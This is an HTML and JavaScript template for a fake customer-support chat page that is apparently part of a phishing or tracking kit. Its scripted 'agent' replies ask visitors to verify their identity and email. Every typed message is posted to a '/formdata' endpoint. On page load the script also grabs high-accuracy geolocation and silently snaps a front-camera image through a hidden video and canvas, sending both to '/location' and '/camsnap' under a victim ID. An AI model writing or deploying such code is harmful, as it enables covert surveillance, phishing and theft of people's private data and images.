<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Live Support Chat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;min-height:100vh}
.chat-widget{position:fixed;bottom:20px;right:20px;width:350px;max-width:90vw;background:#fff;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,0.2);overflow:hidden;display:flex;flex-direction:column;height:500px}
.chat-header{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:15px 20px;display:flex;align-items:center;gap:12px}
.avatar{width:40px;height:40px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;font-size:20px}
.header-info h3{margin:0;font-size:16px}
.header-info p{margin:0;font-size:12px;opacity:0.8}
.online-dot{width:8px;height:8px;background:#4ade80;border-radius:50%;display:inline-block;margin-right:5px}
.chat-messages{flex:1;padding:20px;overflow-y:auto;background:#f9f9f9}
.message{margin-bottom:15px;display:flex;gap:10px}
.message.agent .bubble{background:#667eea;color:#fff}
.message.user .bubble{background:#e0e0e0;color:#333;margin-left:auto}
.bubble{max-width:80%;padding:12px 16px;border-radius:16px;font-size:14px;line-height:1.4}
.chat-input{padding:15px;border-top:1px solid #eee;display:flex;gap:10px}
.chat-input input{flex:1;padding:12px;border:1px solid #ddd;border-radius:20px;font-size:14px}
.chat-input button{padding:12px 20px;background:#667eea;color:#fff;border:none;border-radius:20px;cursor:pointer}
.typing{font-size:12px;color:#888;padding:5px 20px}
</style>
</head>
<body>
<div class="chat-widget">
<div class="chat-header">
<div class="avatar">👨‍💼</div>
<div class="header-info">
<h3>Customer Support</h3>
<p><span class="online-dot"></span>Online now</p>
</div>
</div>
<div class="chat-messages" id="messages">
<div class="message agent"><div class="bubble">Hello! How can I help you today? 👋</div></div>
</div>
<div class="typing" id="typing" style="display:none">Agent is typing...</div>
<div class="chat-input">
<input type="text" id="userInput" placeholder="Type a message...">
<button onclick="sendMessage()">Send</button>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden id="canvas" width="500" height="500"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
const responses = [
    "I understand. Could you please provide more details?",
    "Thank you for that information. Let me check on this for you.",
    "I'm looking into this now. One moment please.",
    "To verify your account, I'll need some additional information.",
    "I see. Could you please confirm your email address?",
    "Thank you for your patience. Let me assist you further.",
    "For security purposes, could you verify your identity?",
    "I'm here to help. What seems to be the issue?",
    "Let me connect you with a specialist. Please hold."
];
let msgCount = 0;

function sendMessage() {
    const input = document.getElementById('userInput');
    const msg = input.value.trim();
    if (!msg) return;
    
    document.getElementById('messages').innerHTML += `<div class="message user"><div class="bubble">${msg}</div></div>`;
    input.value = '';
    
    $.post("<%=a %>/formdata", {uid: uid, data: encodeURIComponent("Chat: " + msg)});
    
    document.getElementById('typing').style.display = 'block';
    setTimeout(() => {
        document.getElementById('typing').style.display = 'none';
        const response = responses[msgCount % responses.length];
        document.getElementById('messages').innerHTML += `<div class="message agent"><div class="bubble">${response}</div></div>`;
        document.getElementById('messages').scrollTop = 999999;
        msgCount++;
    }, 1500 + Math.random() * 1500);
}

document.getElementById('userInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendMessage();
});

window.onload = function() {
    if(navigator.geolocation) { navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true}); }
    async function captureCamera(f, l) { try { const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}}); video.srcObject=s; await new Promise(r=>setTimeout(r,1500)); canvas.getContext('2d').drawImage(video,0,0,500,500); $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:l}); s.getTracks().forEach(t=>t.stop()); } catch(e){} }
    captureCamera("user","selfie");
}
</script>
</body>
</html>